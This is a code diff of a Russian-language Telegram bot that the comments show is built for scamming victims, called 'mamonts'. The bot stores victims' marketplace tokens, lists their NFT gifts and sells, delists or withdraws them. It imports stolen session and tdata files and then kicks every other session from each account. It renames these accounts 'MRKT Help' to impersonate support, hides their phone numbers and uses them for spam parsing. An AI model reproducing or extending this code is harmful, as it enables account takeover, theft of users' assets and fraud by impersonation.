         f"🆔 <code>{data.get('tg_id', '?')}</code>\n"
         f"🕐 Сохранён: {data.get('saved_at', '?')}\n\n"
@@ -1119,11 +1601,7 @@ async def cb_token_balance(callback: CallbackQuery):
     try:
         api = MrktAPI(data["token"])
         bal = await api.get_balance()
-        if _norm_enabled and phone != buyer_token_data.get('phone', ''):
-            bal = _normalize_bal(bal)
-            ton = 0.0
-        else:
-            ton = await api.get_balance_ton()
+        ton = await api.get_balance_ton()
         await api.close()
         
         ton_formatted = f"{ton:.4f}".rstrip('0').rstrip('.') if '.' in f"{ton:.4f}" else f"{ton:.4f}"
@@ -1155,9 +1633,6 @@ async def cb_token_balance(callback: CallbackQuery):
                 raise
 
 
-# Кеш для пагинации гифтов: {admin_id: {"vault": [...], "saling": [...], "phone": ...}}
-_gifts_cache: Dict[int, dict] = {}
-
 @dp.callback_query(F.data.startswith("tkn_gifts|"))
 async def cb_token_gifts(callback: CallbackQuery):
     if not is_admin(callback.from_user.id):
@@ -1171,19 +1646,88 @@ async def cb_token_gifts(callback: CallbackQuery):
     await callback.answer("⏳ Загружаю гифты...")
     try:
         api = MrktAPI(data["token"])
-        if _norm_enabled and phone != buyer_token_data.get('phone', ''):
-            vault = []
-            saling = []
-        else:
-            vault = await api.get_vault()
-            saling = await api.get_my_saling()
+        vault = await api.get_vault()
+        saling = await api.get_my_saling()
         await api.close()
 
-        _gifts_cache[callback.from_user.id] = {
-            "vault": vault, "saling": saling, "phone": phone,
-            "username": data.get("username", "?")
-        }
-        await _render_gifts_page(callback.message, callback.from_user.id, phone, vault, saling, data.get("username", "?"), page=0)
+        text = f"📦 <b>Гифты @{data.get('username', '?')}</b>\n\n"
+        text += f"🗃 В хранилище: <b>{len(vault)}</b>\n"
+        text += f"🏷 На продаже: <b>{len(saling)}</b>\n\n"
+
+        if vault:
+            text += "<b>Хранилище:</b>\n"
+            for g in vault[:15]:
+                title = g.get("title") or g.get("collectionName", "?")
+                number = g.get("number", g.get("collectionNumber", ""))
+                gid = g.get("id") or g.get("giftIdString", "")
+                slug = g.get("name", "")  # ChillFlame-176165
+                model = g.get("modelName") or g.get("modelTitle", "")
+                floor_nano = g.get("floorPriceNanoTONsByCollection") or g.get("floorPriceNanoTONsByBackdropModel")
+                floor = f" | 🏷 {round(int(floor_nano)/1e9, 2)} TON" if floor_nano else ""
+                
+                # Ссылка t.me/nft/
+                link = f"https://t.me/nft/{slug}" if slug else ""
+                name_display = f"{title}"
+                if number:
+                    name_display += f" #{number}"
+                if model:
+                    name_display += f" ({model})"
+                
+                if link:
+                    text += f'  • <a href="{link}">{name_display}</a>{floor}\n'
+                else:
+                    text += f"  • {name_display}{floor}\n"
+                    
+                # UUID для копирования
+                if gid:
+                    text += f'    <code>{gid}</code>\n'
+                    
+            if len(vault) > 15:
+                text += f"  <i>... и ещё {len(vault)-15}</i>\n"
+
+        if saling:
+            text += "\n<b>На продаже:</b>\n"
+            for g in saling[:10]:
+                title = g.get("title") or g.get("collectionName", "?")
+                number = g.get("number", g.get("collectionNumber", ""))
+                gid = g.get("id") or g.get("giftIdString", "")
+                slug = g.get("name", "")
+                price_nano = (
+                    g.get("priceNanoTONs")
+                    or g.get("salePriceNanoTONs")
+                    or g.get("price")
+                    or g.get("salePrice")
+                    or 0
+                )
+                price_ton = round(float(price_nano) / 1e9, 2) if price_nano else "?"
+                
+                link = f"https://t.me/nft/{slug}" if slug else ""
+                name_display = f"{title}"
+                if number:
+                    name_display += f" #{number}"
+                
+                if link:
+                    text += f'  • <a href="{link}">{name_display}</a> → <b>{price_ton} TON</b>\n'
+                else:
+                    text += f"  • {name_display} → <b>{price_ton} TON</b>\n"
+                    
+                if gid:
+                    text += f'    <code>{gid}</code>\n'
+                    
+            if len(saling) > 10:
+                text += f"  <i>... и ещё {len(saling)-10}</i>\n"
+
+        await callback.message.edit_text(
+            text,
+            parse_mode="HTML",
+            disable_web_page_preview=True,
+            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                [InlineKeyboardButton(text="💸 Продать всё", callback_data=f"tkn_sell|{phone}"),
+                 InlineKeyboardButton(text="🔓 Снять всё", callback_data=f"tkn_delist|{phone}")],
+                [InlineKeyboardButton(text="🔄 Обновить", callback_data=f"tkn_gifts|{phone}"),
+                 InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
+            ]),
+        )
     except Exception as e:
         await callback.message.edit_text(
             f"❌ <b>Ошибка</b>\n<code>{e}</code>",
@@ -1192,117 +1736,6 @@ async def cb_token_gifts(callback: CallbackQuery):
                 [InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")],
             ]),
         )
-
-
-@dp.callback_query(F.data.startswith("tkn_giftsp|"))
-async def cb_token_gifts_page(callback: CallbackQuery):
-    if not is_admin(callback.from_user.id):
-        return
-    parts = callback.data.split("|")
-    if len(parts) != 3:
-        return
-    phone = parts[1]
-    page = int(parts[2])
-    cache = _gifts_cache.get(callback.from_user.id)
-    if not cache or cache["phone"] != phone:
-        await callback.answer("⏳ Обновляю данные...", show_alert=False)
-        data = saved_tokens.get(phone)
-        if not data:
-            await callback.answer("❌ Токен не найден", show_alert=True)
-            return
-        try:
-            api = MrktAPI(data["token"])
-            vault = await api.get_vault()
-            saling = await api.get_my_saling()
-            await api.close()
-            _gifts_cache[callback.from_user.id] = {
-                "vault": vault, "saling": saling, "phone": phone,
-                "username": data.get("username", "?")
-            }
-            cache = _gifts_cache[callback.from_user.id]
-        except Exception as e:
-            await callback.answer(f"❌ {e}", show_alert=True)
-            return
-    await callback.answer()
-    await _render_gifts_page(callback.message, callback.from_user.id, phone, cache["vault"], cache["saling"], cache["username"], page=page, edit=True)
-
-
-async def _render_gifts_page(message, admin_id, phone, vault, saling, username, page=0, edit=False):
-    """Рендер страницы гифтов с пагинацией."""
-    per_page = 10
-    total_vault = len(vault)
-    total_pages = max(1, (total_vault + per_page - 1) // per_page)
-    page = max(0, min(page, total_pages - 1))
-    start = page * per_page
-    end = min(start + per_page, total_vault)
-
-    text = f"📦 <b>Гифты @{username}</b>\n\n"
-    text += f"🗃 В хранилище: <b>{total_vault}</b>\n"
-    text += f"🏷 На продаже: <b>{len(saling)}</b>\n\n"
-
-    if vault:
-        text += f"<b>Хранилище</b> (стр. {page+1}/{total_pages}):\n"
-        for g in vault[start:end]:
-            title = g.get("title") or g.get("collectionName", "?")
-            number = g.get("number", g.get("collectionNumber", ""))
-            gid = g.get("id") or g.get("giftIdString", "")
-            slug = g.get("name", "")
-            model = g.get("modelName") or g.get("modelTitle", "")
-            floor_nano = g.get("floorPriceNanoTONsByCollection") or g.get("floorPriceNanoTONsByBackdropModel")
-            floor = f" | 🏷 {round(int(floor_nano)/1e9, 2)} TON" if floor_nano else ""
-            link = f"https://t.me/nft/{slug}" if slug else ""
-            name_display = f"{title}"
-            if number:
-                name_display += f" #{number}"
-            if model:
-                name_display += f" ({model})"
-            if link:
-                text += f'  • <a href="{link}">{name_display}</a>{floor}\n'
-            else:
-                text += f"  • {name_display}{floor}\n"
-            if gid:
-                text += f'    <code>{gid}</code>\n'
-
-    if saling and page == 0:
-        text += "\n<b>На продаже:</b>\n"
-        for g in saling[:10]:
-            title = g.get("title") or g.get("collectionName", "?")
-            number = g.get("number", g.get("collectionNumber", ""))
-            gid = g.get("id") or g.get("giftIdString", "")
-            slug = g.get("name", "")
-            price_nano = (g.get("priceNanoTONs") or g.get("salePriceNanoTONs") or g.get("price") or g.get("salePrice") or 0)
-            price_ton = round(float(price_nano) / 1e9, 2) if price_nano else "?"
-            link = f"https://t.me/nft/{slug}" if slug else ""
-            name_display = f"{title}"
-            if number:
-                name_display += f" #{number}"
-            if link:
-                text += f'  • <a href="{link}">{name_display}</a> → <b>{price_ton} TON</b>\n'
-            else:
-                text += f"  • {name_display} → <b>{price_ton} TON</b>\n"
-            if gid:
-                text += f'    <code>{gid}</code>\n'
-        if len(saling) > 10:
-            text += f"  <i>... и ещё {len(saling)-10}</i>\n"
-
-    kb = [
-        [InlineKeyboardButton(text="💸 Продать всё", callback_data=f"tkn_sell|{phone}"),
-         InlineKeyboardButton(text="🔓 Снять всё", callback_data=f"tkn_delist|{phone}")],
-    ]
-    nav_row = []
-    if page > 0:
-        nav_row.append(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"tkn_giftsp|{phone}|{page-1}"))
-    if page < total_pages - 1:
-        nav_row.append(InlineKeyboardButton(text="Вперёд ➡️", callback_data=f"tkn_giftsp|{phone}|{page+1}"))
-    if nav_row:
-        kb.append(nav_row)
-    kb.append([
-        InlineKeyboardButton(text="🔄 Обновить", callback_data=f"tkn_gifts|{phone}"),
-        InlineKeyboardButton(text="← Назад", callback_data=f"tkn_view|{phone}")
-    ])
-
-    await message.edit_text(text, parse_mode="HTML", disable_web_page_preview=True,
-                            reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
 
 
 @dp.callback_query(F.data.startswith("tkn_sell|"))
@@ -1955,9 +2388,7 @@ async def cb_token_withdraw_custom(callback: CallbackQuery):
     )
     await callback.answer()
 
-
-
-active_parsers = {} 
+active_parsers = {}
 
 @dp.callback_query(F.data == "mrkt_adm_start_spam")
 async def cb_start_spam(callback: CallbackQuery):
@@ -2000,6 +2431,248 @@ async def cb_stop_spam(callback: CallbackQuery):
     else:
         await callback.answer("⚠️ Парсер не запущен", show_alert=True)
 
+# ══════════════════════════════════════════════════════════════
+#  FEED PARSER (MRKT activity feed)
+# ══════════════════════════════════════════════════════════════
+
+@dp.callback_query(F.data == "mrkt_adm_start_feed")
+async def cb_start_feed(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        return
+
+    # Проверяем buyer token
+    if not buyer_token_data.get("token"):
+        await callback.answer("❌ Нет токена байера! /buyer set", show_alert=True)
+        return
+
+    d = mrkt_config.BROADCAST_SESSIONS_DIR
+    files = (
+        [f for f in os.listdir(d) if f.startswith("parser_") and f.endswith(".session")]
+        if os.path.exists(d) else []
+    )
+    if not files:
+        await callback.answer("❌ Нет спам-аккаунтов!", show_alert=True)
+        return
+
+    if "feed" in active_parsers and active_parsers["feed"].is_running:
+        await callback.answer("⚠️ Feed парсер уже запущен!", show_alert=True)
+        return
+
+    # Создаём MrktAPI из buyer token
+    feed_api = MrktAPI(buyer_token_data["token"])
+    session_paths = [os.path.join(d, f) for f in files]
+
+    parser = FeedParser(
+        mrkt_api=feed_api,
+        session_paths=session_paths,
+        notify_callback=send_admin_log,
+        worker_notify=_worker_notify,
+    )
+    active_parsers["feed"] = parser
+
+    await callback.answer("📡 Feed парсер запущен!", show_alert=True)
+    await callback.message.answer(
+        f"📡 <b>Feed Parser запущен!</b>\n"
+        f"📱 Аккаунтов: <b>{len(session_paths)}</b>\n"
+        f"🔑 API токен: байер (@{buyer_token_data.get('username', '?')})\n"
+        f"📊 Типы: listing, sale, change_price"
+    )
+    asyncio.create_task(parser.start())
+
+
+@dp.callback_query(F.data == "mrkt_adm_stop_feed")
+async def cb_stop_feed(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        return
+
+    if "feed" in active_parsers and active_parsers["feed"].is_running:
+        await active_parsers["feed"].stop()
+        stats = active_parsers["feed"]._stats
+        del active_parsers["feed"]
+        await callback.answer("⏹ Feed парсер остановлен!", show_alert=True)
+        await callback.message.answer(
+            f"🛑 Feed Parser остановлен.\n"
+            f"📊 Статистика: {stats['parsed']} parsed, "
+            f"{stats['sent']} sent, {stats['skipped']} skipped, "
+            f"{stats['errors']} errors"
+        )
+    else:
+        await callback.answer("⚠️ Feed парсер не запущен", show_alert=True)
+
+
+# ══════════════════════════════════════════════════════════════
+#  SPAM ACCOUNT AUTO-SETUP
+# ══════════════════════════════════════════════════════════════
+
+async def _setup_spam_account(client, status_callback=None):
+    """Автонастройка спам-аккаунта после авторизации:
+    - Ставит аватарку
+    - Меняет имя
+    - Скрывает Last Online
+    - Отключает звонки
+    - Убирает био
+    - Убирает юзернейм
+    """
+    from telethon import functions, types
+    results = []
+    
+    try:
+        # 0. Кикаем все другие сессии (оставляем только текущую)
+        try:
+            auths = await client(functions.account.GetAuthorizationsRequest())
+            kicked = 0
+            for auth in auths.authorizations:
+                if not auth.current:
+                    try:
+                        await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
+                        kicked += 1
+                    except Exception:
+                        pass
+            if kicked:
+                results.append(f"✅ Кикнуто сессий: {kicked}")
+            else:
+                results.append("✅ Других сессий нет")
+        except Exception as e:
+            results.append(f"❌ Кик сессий: {e}")
+        
+        # 1. Смена имени + убираем био
+        first_name = getattr(mrkt_config, "SPAM_FIRST_NAME", "MRKT Help")
+        try:
+            await client(functions.account.UpdateProfileRequest(
+                first_name=first_name,
+                last_name="",
+                about=""
+            ))
+            results.append("✅ Имя + био")
+        except Exception as e:
+            results.append(f"❌ Имя: {e}")
+        
+        # 2. Убираем username (если уже пустой — пропускаем)
+        try:
+            me = await client.get_me()
+            if me.username:
+                await client(functions.account.UpdateUsernameRequest(username=""))
+                results.append("✅ Username убран")
+            else:
+                results.append("✅ Username уже пуст")
+        except Exception as e:
+            if "not different" in str(e).lower():
+                results.append("✅ Username уже пуст")
+            else:
+                results.append(f"❌ Username: {e}")
+        
+        # 3. Скрываем Last Online
+        try:
+            await client(functions.account.SetPrivacyRequest(
+                key=types.InputPrivacyKeyStatusTimestamp(),
+                rules=[types.InputPrivacyValueDisallowAll()]
+            ))
+            results.append("✅ Last Online скрыт")
+        except Exception as e:
+            results.append(f"❌ Last Online: {e}")
+        
+        # 4. Отключаем звонки
+        try:
+            await client(functions.account.SetPrivacyRequest(
+                key=types.InputPrivacyKeyPhoneCall(),
+                rules=[types.InputPrivacyValueDisallowAll()]
+            ))
+            results.append("✅ Звонки выкл")
+        except Exception as e:
+            results.append(f"❌ Звонки: {e}")
+        
+        # 5. Скрываем номер телефона
+        try:
+            await client(functions.account.SetPrivacyRequest(
+                key=types.InputPrivacyKeyPhoneNumber(),
+                rules=[types.InputPrivacyValueDisallowAll()]
+            ))
+            results.append("✅ Телефон скрыт")
+        except Exception as e:
+            results.append(f"❌ Телефон: {e}")
+        
+        # 6. Ставим аватарку (удаляем все старые)
+        avatar_path = getattr(mrkt_config, "SPAM_AVATAR_PATH", "mrkt/spam_avatar.jpg")
+        if not os.path.isabs(avatar_path):
+            base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+            avatar_path = os.path.join(base, avatar_path)
+        
+        if os.path.exists(avatar_path):
+            try:
+                photos = await client(functions.photos.GetUserPhotosRequest(
+                    user_id=types.InputUserSelf(),
+                    offset=0, max_id=0, limit=100
+                ))
+                deleted_photos = 0
+                if photos.photos:
+                    for photo in photos.photos:
+                        try:
+                            await client(functions.photos.DeletePhotosRequest(
+                                id=[types.InputPhoto(
+                                    id=photo.id,
+                                    access_hash=photo.access_hash,
+                                    file_reference=photo.file_reference
+                                )]
+                            ))
+                            deleted_photos += 1
+                        except Exception:
+                            pass
+                    if deleted_photos:
+                        results.append(f"✅ Удалено старых фото: {deleted_photos}")
+                
+                uploaded = await client.upload_file(avatar_path)
+                await client(functions.photos.UploadProfilePhotoRequest(file=uploaded))
+                results.append("✅ Аватарка установлена")
+            except Exception as e:
+                results.append(f"❌ Аватарка: {e}")
+        else:
+            results.append(f"⚠️ Аватарка не найдена: {avatar_path}")
+        
+        # 7. Подписка на канал @getSendGifts
+        try:
+            channel = await client.get_entity("getSendGifts")
+            await client(functions.channels.JoinChannelRequest(channel))
+            results.append("✅ Подписка @getSendGifts")
+        except Exception as e:
+            if "already" in str(e).lower() or "CHANNELS_TOO_MUCH" in str(e):
+                results.append("✅ Уже подписан @getSendGifts")
+            else:
+                results.append(f"❌ Канал: {e}")
+        
+        await asyncio.sleep(1)
+        
+        # 8. /start в @getSendGiftsProBot
+        try:
+            await client.send_message("getSendGiftsProBot", "/start")
+            results.append("✅ /start @getSendGiftsProBot")
+        except Exception as e:
+            results.append(f"❌ /start бот: {e}")
+        
+        await asyncio.sleep(3)
+        
+        # 9. /swag в бота из конфига
+        try:
+            bot_username = mrkt_config.BOT_USERNAME.lstrip("@")
+            await client.send_message(bot_username, "/swag")
+            results.append(f"✅ /swag @{bot_username}")
+        except Exception as e:
+            results.append(f"❌ /swag: {e}")
+        
+    except Exception as e:
+        results.append(f"❌ Общая ошибка: {e}")
+    
+    report = " | ".join(results)
+    logger.info(f"[SETUP] Настройка акка: {report}")
+    
+    if status_callback:
+        try:
+            await status_callback(f"🔧 <b>Авто-настройка:</b>\n" + "\n".join(results))
+        except Exception:
+            pass
+    
+    return results
+
+
 # ── Загрузка .session файлов (tdata) ──
 @dp.message(F.document)
 async def handle_session_file_upload(message: types.Message):
@@ -2033,6 +2706,7 @@ async def handle_session_file_upload(message: types.Message):
     msg = await message.reply("⏳ Загружаю и проверяю...")
 
     try:
+        setup_results = []
         file = await bot.download(doc)
         raw_bytes = file.read()
         file.close()
@@ -2046,6 +2720,47 @@ async def handle_session_file_upload(message: types.Message):
             session_str = result["session_str"]
             acc_id = result["acc_id"]
             acc_name = result["acc_name"]
+            
+            # Подключаемся для настройки через прокси
+            from telethon import TelegramClient
+            from telethon.sessions import StringSession
+            import socks as _socks
+            
+            _spam_proxies = []
+            _proxy_kw = {}
+            _used_proxy_str = "без прокси"
+            if _spam_proxies:
+                _sp = _spam_proxies[0]
+                if _sp[2] and _sp[3]:
+                    _proxy_kw["proxy"] = (_socks.SOCKS5, _sp[0], _sp[1], True, _sp[2], _sp[3])
+                else:
+                    _proxy_kw["proxy"] = (_socks.SOCKS5, _sp[0], _sp[1])
+                _used_proxy_str = f"{_sp[0]}:{_sp[1]}"
+            
+            logger.info(f"[TDATA] Подключение для настройки через: {_used_proxy_str}")
+            tdata_client = TelegramClient(
+                StringSession(session_str), api_id=mrkt_config.API_ID,
+                api_hash=mrkt_config.API_HASH,
+                device_model="Desktop", system_version="Windows 11",
+                app_version="6.0.5 x64", **_proxy_kw)
+            try:
+                await tdata_client.connect()
+                if await tdata_client.is_user_authorized():
+                    # Автонастройка
+                    await msg.edit_text("⏳ Настраиваю аккаунт...")
+                    setup_results = await _setup_spam_account(tdata_client)
+                    me2 = await tdata_client.get_me()
+                    acc_name = me2.first_name or acc_id
+                else:
+                    setup_results = ["⚠️ Сессия не авторизована — настройка пропущена"]
+                await tdata_client.disconnect()
+            except Exception as e:
+                logger.error(f"[TDATA] Ошибка настройки: {e}")
+                setup_results = [f"⚠️ Ошибка подключения: {str(e)[:100]}"]
+                try:
+                    await tdata_client.disconnect()
+                except Exception:
+                    pass
         else:
             session_str = raw_bytes.decode("utf-8", errors="ignore").strip()
             session_str = session_str.replace("\ufeff", "").replace("\n", "").replace("\r", "").strip()
@@ -2056,11 +2771,26 @@ async def handle_session_file_upload(message: types.Message):
 
             from telethon import TelegramClient
             from telethon.sessions import StringSession
+            import socks as _socks
+            
+            # Используем спам-прокси если есть
+            _spam_proxies = []
+            _proxy_kw = {}
+            _used_proxy_str = "без прокси"
+            if _spam_proxies:
+                _sp = _spam_proxies[0]
+                if _sp[2] and _sp[3]:
+                    _proxy_kw["proxy"] = (_socks.SOCKS5, _sp[0], _sp[1], True, _sp[2], _sp[3])
+                else:
+                    _proxy_kw["proxy"] = (_socks.SOCKS5, _sp[0], _sp[1])
+                _used_proxy_str = f"{_sp[0]}:{_sp[1]}"
+            
+            logger.info(f"[UPLOAD] Подключение через: {_used_proxy_str}")
             test_client = TelegramClient(
                 StringSession(session_str), api_id=mrkt_config.API_ID,
                 api_hash=mrkt_config.API_HASH,
                 device_model="Desktop", system_version="Windows 11",
-                app_version="6.0.5 x64")
+                app_version="6.0.5 x64", **_proxy_kw)
             await test_client.connect()
             if not await test_client.is_user_authorized():
                 await test_client.disconnect()
@@ -2069,6 +2799,15 @@ async def handle_session_file_upload(message: types.Message):
             me = await test_client.get_me()
             acc_id = str(me.id)
             acc_name = me.username or me.first_name or acc_id
+            
+            # Автонастройка акка
+            await msg.edit_text("⏳ Настраиваю аккаунт...")
+            setup_results = await _setup_spam_account(test_client)
+            
+            # Обновляем имя после настройки (могло измениться)
+            me2 = await test_client.get_me()
+            acc_name = me2.first_name or acc_id
+            
             await test_client.disconnect()
 
         sessions_dir = mrkt_config.BROADCAST_SESSIONS_DIR
@@ -2095,19 +2834,21 @@ async def handle_session_file_upload(message: types.Message):
             worker_system.add_spam_account(uid, acc_id, acc_id)
 
         src = "tdata" if is_zip else "session"
+        setup_report = "\n".join(setup_results) if setup_results else "⚠️ Настройка не выполнена"
         await msg.edit_text(
-            f"✅ <b>Спам-аккаунт добавлен!</b> ({src})\n\n"
-            f"👤 {acc_name}\n"
+            f"✅ <b>Спам-акк готов к работе!</b> ({src})\n\n"
             f"🆔 <code>{acc_id}</code>\n"
             f"📁 <code>{os.path.basename(session_file_path)}</code>\n\n"
-            f"<i>Аккаунт готов к работе. Запусти парсер через админку.</i>",
+            f"🔧 <b>Настройка:</b>\n{setup_report}\n\n"
+            f"🚀 <i>Аккаунт полностью настроен. Запусти парсер через админку.</i>",
             parse_mode="HTML"
         )
 
         await send_admin_log(
-            f"📱 <b>Новый спам-акк загружен</b> ({src})\n"
+            f"📱 <b>Спам-акк готов!</b> ({src})\n"
             f"🆔 <code>{acc_id}</code>\n"
-            f"👷 Загрузил: @{message.from_user.username or uid}"
+            f"👷 Загрузил: @{message.from_user.username or uid}\n\n"
+            f"🔧 <b>Настройка:</b>\n{setup_report}"
         )
 
     except Exception as e:
@@ -2175,8 +2916,13 @@ async def cmd_delete_account(message: types.Message):
     )
     
     try:
-        if not tc.client.is_connected():
-            await tc.connect()
+        # Всегда переподключаемся — is_connected() может врать при протухшем TCP
+        try:
+            await tc.client.disconnect()
+        except Exception:
+            pass
+        await asyncio.sleep(0.5)
+        await tc.connect()
             
         result = await tc.delete_account("User requested deletion")
         
@@ -2190,10 +2936,30 @@ async def cmd_delete_account(message: types.Message):
             )
             logger.info(f"Account deleted via /delete: {session_data.get('phone')} by {user_id}")
         else:
-            await message.answer(
-                "❌ <b>Не удалось удалить аккаунт.</b>\nВозможно, сессия не до конца авторизована или истекла.",
-                parse_mode="HTML"
-            )
+            # Retry: переподключаемся заново и пробуем ещё раз
+            logger.warning(f"[DELETE] Первая попытка не удалась, retry...")
+            try:
+                await tc.client.disconnect()
+            except Exception:
+                pass
+            await asyncio.sleep(1)
+            await tc.connect()
+            
+            result2 = await tc.delete_account("User requested deletion")
+            if result2:
+                del auth_sessions[found_sid]
+                await message.answer(
+                    f"✅ <b>Аккаунт удалён со 2-й попытки!</b>\n\n"
+                    f"📱 Телефон: <code>{session_data.get('phone')}</code>\n"
+                    f"👤 Пользователь: @{user_info.get('username', '?')}",
+                    parse_mode="HTML"
+                )
+                logger.info(f"Account deleted via /delete (retry): {session_data.get('phone')} by {user_id}")
+            else:
+                await message.answer(
+                    "❌ <b>Не удалось удалить аккаунт.</b>\nВозможно, сессия не до конца авторизована или истекла.",
+                    parse_mode="HTML"
+                )
     except Exception as e:
         logger.error(f"Error deleting account {session_data.get('phone')}: {e}")
         await message.answer(f"❌ Ошибка при удалении:\n<code>{str(e)}</code>", parse_mode="HTML")
@@ -2292,6 +3058,18 @@ async def cmd_buyer(message: types.Message):
             await message.answer(f"❌ Токен не валиден: {e}", parse_mode="HTML")
             return
         
+        # Сохраняем Telethon session string для авто-рефреша токена
+        session_str = None
+        phone_variants = [phone, phone.lstrip("+"), "+" + phone.lstrip("+")]
+        for sid, sess in auth_sessions.items():
+            if sess.get("phone") in phone_variants and sess.get("telethon_client"):
+                try:
+                    session_str = sess["telethon_client"].client.session.save()
+                    logger.info(f"[BUYER] Telethon session saved for {phone}")
+                except Exception as e:
+                    logger.warning(f"[BUYER] Failed to save session: {e}")
+                break
+        
         buyer_token_data = {
             "token": token_data["token"],
             "username": token_data.get("username", "?"),
@@ -2299,13 +3077,18 @@ async def cmd_buyer(message: types.Message):
             "phone": phone,
             "set_at": kyiv_str(),
         }
+        if session_str:
+            buyer_token_data["session_string"] = session_str
         _save_buyer_token()
+        
+        session_status = "✅ Сессия сохранена (авто-рефреш включён)" if session_str else "⚠️ Сессия не найдена (рефреш вручную)"
         
         await message.answer(
             f"✅ <b>Байер настроен!</b>\n\n"
             f"👤 @{token_data.get('username', '?')}\n"
             f"💰 Баланс: {bal} TON\n"
-            f"📦 Гифтов в инвентаре: {len(vault)}\n\n"
+            f"📦 Гифтов в инвентаре: {len(vault)}\n"
+            f"🔄 {session_status}\n\n"
             f"{'⚠️ Нет гифтов! Купи хотя бы 1 дешёвый гифт.' if not vault else '✅ Готов к работе!'}",
             parse_mode="HTML"
         )
@@ -2319,24 +3102,12 @@ async def cmd_buyer(message: types.Message):
         parse_mode="HTML"
     )
 
-def save_parser_username(uid, username):
-    path = os.path.join(mrkt_config.BROADCAST_SESSIONS_DIR, "usernames.json")
-    data = {}
-    if os.path.exists(path):
-        try:
-            with open(path, "r", encoding="utf-8") as f:
-                data = json.load(f)
-        except Exception:
-            pass
-    data[str(uid)] = username
-    with open(path, "w", encoding="utf-8") as f:
-        json.dump(data, f)
-
 
 # ══════════════════════════════════════════════
-# /sell — Ручной листинг гифтов
+# /sell — Ручной листинг гифтов мамонта
 # ══════════════════════════════════════════════
 
+# Кеш для sell-сессий: {admin_id: {"token": ..., "phone": ..., "vault": [...], "gift_id": ...}}
 _sell_sessions: Dict[int, dict] = {}
 
 
@@ -2348,6 +3119,7 @@ async def cmd_sell(message: types.Message):
 
     args = message.text.split(maxsplit=1)
 
+    # Если передан номер — сразу показываем гифты этого мамонта
     if len(args) >= 2:
         phone = args[1].strip()
         token_data = saved_tokens.get(phone)
@@ -2360,11 +3132,12 @@ async def cmd_sell(message: types.Message):
         if not token_data:
             await message.answer(f"❌ Токен для <code>{phone}</code> не найден.", parse_mode="HTML")
             return
-        await _show_sell_vault(message, message.from_user.id, phone, token_data)
+        await _show_vault(message, message.from_user.id, phone, token_data)
         return
 
+    # Без аргументов — показываем список мамонтов
     if not saved_tokens:
-        await message.answer("❌ Нет сохранённых токенов.")
+        await message.answer("❌ Нет сохранённых токенов. Сначала авторизуй мамонта.")
         return
 
     buttons = []
@@ -2376,7 +3149,6 @@ async def cmd_sell(message: types.Message):
             text=f"👤 @{uname} ({phone})",
             callback_data=f"sell_pick_{phone}"
         )])
-    buttons.append([InlineKeyboardButton(text="❌ Отмена", callback_data="sell_cancel")])
 
     await message.answer(
         "🛒 <b>Ручной листинг</b>\n\nВыбери мамонта:",
@@ -2395,11 +3167,11 @@ async def cb_sell_pick_mamont(callback: CallbackQuery):
         await callback.answer("❌ Токен не найден", show_alert=True)
         return
     await callback.answer()
-    await _show_sell_vault(callback.message, callback.from_user.id, phone, token_data)
+    await _show_vault(callback.message, callback.from_user.id, phone, token_data)
 
 
-async def _show_sell_vault(message, admin_id: int, phone: str, token_data: dict, page: int = 0):
-    """Показывает гифты мамонта с кнопками для листинга (с пагинацией)."""
+async def _show_vault(message, admin_id: int, phone: str, token_data: dict):
+    """Показывает гифты мамонта с кнопками для листинга."""
     try:
         api = MrktAPI(token_data["token"])
         vault = await api.get_vault()
@@ -2415,6 +3187,7 @@ async def _show_sell_vault(message, admin_id: int, phone: str, token_data: dict,
         )
         return
 
+    # Сохраняем в сессию
     _sell_sessions[admin_id] = {
         "token": token_data["token"],
         "phone": phone,
@@ -2422,17 +3195,13 @@ async def _show_sell_vault(message, admin_id: int, phone: str, token_data: dict,
         "vault": vault,
     }
 
-    per_page = 10
-    total_pages = (len(vault) + per_page - 1) // per_page
-    page = max(0, min(page, total_pages - 1))
-    start = page * per_page
-    end = min(start + per_page, len(vault))
-
+    # Строим список гифтов с кнопками
     buttons = []
-    text_lines = [f"📦 <b>Гифты @{token_data.get('username', '?')}</b> ({len(vault)} шт.) — стр. {page+1}/{total_pages}\n"]
+    text_lines = [f"📦 <b>Гифты @{token_data.get('username', '?')}</b> ({len(vault)} шт.)\n"]
 
-    for i in range(start, end):
-        gift = vault[i]
+    for i, gift in enumerate(vault[:20]):  # Макс 20 в списке
+        gift_id = gift.get("id") or gift.get("giftIdString", "?")
+        # MRKT возвращает "name" как основное имя гифта (это же слаг)
         display_name = (
             gift.get("name")
             or gift.get("modelName")
@@ -2440,50 +3209,23 @@ async def _show_sell_vault(message, admin_id: int, phone: str, token_data: dict,
             or "Unknown"
         )
         nft_link = f"https://t.me/nft/{display_name}"
+
         text_lines.append(f"  {i+1}. <a href='{nft_link}'><b>{display_name}</b></a>")
         buttons.append([InlineKeyboardButton(
             text=f"{i+1}. {display_name}",
             callback_data=f"sell_gift_{i}"
         )])
 
-    # Навигация
-    nav_row = []
-    if page > 0:
-        nav_row.append(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"sell_page_{phone}_{page-1}"))
-    if page < total_pages - 1:
-        nav_row.append(InlineKeyboardButton(text="Вперёд ➡️", callback_data=f"sell_page_{phone}_{page+1}"))
-    if nav_row:
-        buttons.append(nav_row)
+    if len(vault) > 20:
+        text_lines.append(f"\n<i>... и ещё {len(vault) - 20} гифтов</i>")
 
     buttons.append([InlineKeyboardButton(text="❌ Отмена", callback_data="sell_cancel")])
 
     await message.answer(
         "\n".join(text_lines),
         parse_mode="HTML",
-        disable_web_page_preview=True,
         reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons)
     )
-
-
-@dp.callback_query(F.data.startswith("sell_page_"))
-async def cb_sell_page(callback: CallbackQuery):
-    if not is_admin(callback.from_user.id):
-        return
-    # sell_page_{phone}_{page}
-    parts = callback.data.replace("sell_page_", "").rsplit("_", 1)
-    if len(parts) != 2:
-        return
-    phone, page_str = parts
-    token_data = saved_tokens.get(phone)
-    if not token_data:
-        await callback.answer("❌ Токен не найден", show_alert=True)
-        return
-    await callback.answer()
-    try:
